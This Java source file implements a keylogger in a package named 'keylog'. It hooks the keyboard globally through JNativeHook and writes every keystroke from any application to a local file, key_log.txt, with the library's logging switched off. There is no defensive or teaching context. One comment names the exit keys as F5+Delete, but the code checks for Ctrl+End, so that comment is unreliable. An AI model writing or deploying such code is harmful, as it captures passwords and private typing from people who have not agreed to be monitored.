/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylog;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.event.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashSet;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;

public class JNative implements NativeKeyListener {
    private BufferedWriter writer;
    private Set<Integer> pressedKeys;

    public JNative() {
        try {
            // Mở tệp để ghi
            writer = new BufferedWriter(new FileWriter("key_log.txt"));
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Thiết lập lắng nghe sự kiện phím toàn cầu
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Failed to register native hook");
            ex.printStackTrace();
            System.exit(1);
        }

        // Gán đối tượng NativeKeyListener cho lắng nghe sự kiện phím
        GlobalScreen.addNativeKeyListener(this);

        // Ngăn việc in log từ JNativeHook
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        // Khởi tạo danh sách các phím đang được nhấn
        pressedKeys = new HashSet<>();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            int keyCode = e.getKeyCode();
            System.out.println(NativeKeyEvent.getKeyText(keyCode));
            pressedKeys.add(keyCode);
            
            if (keyCode == NativeKeyEvent.VC_SPACE) {
                writer.write(" ");
            } else if (pressedKeys.contains(NativeKeyEvent.VC_CONTROL) && e.getRawCode() == KeyEvent.VK_END) {
                System.out.println("OFF");
                // Tắt chương trình nếu nhấn tổ hợp phím F5 + Delete
                writer.close(); // Đóng BufferedWriter
                GlobalScreen.unregisterNativeHook(); // Hủy đăng ký lắng nghe sự kiện phím
                System.exit(0); // Thoát chương trình
            } else {
                // Ghi ký tự vào tệp
                writer.write(NativeKeyEvent.getKeyText(keyCode));
            }
            writer.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (NativeHookException ex) {
            Logger.getLogger(JNative.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Không cần xử lý sự kiện này
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Không cần xử lý sự kiện này
    }

    public static void main(String[] args) {
        JNative keyLogger = new JNative();
    }
}
